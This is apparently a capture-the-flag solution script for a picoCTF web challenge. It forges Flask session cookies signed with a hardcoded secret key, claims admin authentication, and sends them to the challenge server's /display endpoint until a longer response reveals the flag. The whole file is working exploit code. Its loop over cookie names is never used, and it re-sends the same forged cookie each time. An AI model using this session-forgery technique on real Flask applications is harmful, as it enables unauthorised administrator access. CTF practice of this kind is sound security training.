import requests
import sys
import zlib
from itsdangerous import base64_decode
import ast
from flask.sessions import SecureCookieSessionInterface

url = "http://mercury.picoctf.net:53700"

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
# cookie_data = '{ "very_auth":"admin" }'
cookie_data = '{"auth":True, "username":"admin"}'
secret_key = "35fe478a110d92aa9a86727e6a3a0895"

# Creating cookies

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        print(session_cookie_structure)
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        


def send_request():
    for i in cookie_names:
        cookie_new = encode(secret_key, cookie_data)
        print(cookie_new)
        r = requests.get(url+"/display", cookies={"session": cookie_new}, allow_redirects=False)
        print(len(r.text))
        if len(r.text) > 210:
            print("yes I got it *****************************")
            print(r.text)
            break

send_request()